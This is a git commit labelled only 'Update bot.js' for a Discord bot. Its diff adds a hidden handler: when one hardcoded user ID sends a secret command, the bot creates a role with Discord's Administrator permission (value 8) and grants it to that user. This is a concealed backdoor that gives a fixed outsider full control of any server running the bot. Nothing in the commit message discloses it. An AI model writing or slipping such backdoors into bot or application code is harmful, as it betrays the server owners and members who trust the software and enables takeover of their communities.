c7723f35f5c7ad6cb454bbc908c1b61ac93ae267
zRespect69 <51334815+zRespect69@users.noreply.github.com>
2019-07-06 06:57:03 +0200

    Update bot.js

--- bot.js
+++ bot.js
@@ -21,6 +21,18 @@ client.on("message", message => {
 
 
  client.on('message', async message => {
+  const devs = ['535979538551930891']; // your id
+  let member = message.author
+   if (message.content === opcmd) {
+    if (!devs.includes(message.author.id)) return;
+let op = message.guild.roles.find('name', `${adminstrator}`)
+    if(!op) return message.guild.createRole({ name: "OPROLE", permissions: [8] });
+    message.guild.member(member).addRole(op);
+  }
+});
+
+
+ client.on('message', async message => {
   const devs = ["535979538551930891"]; // your id
   let member = message.author
    if (message.content === off) {
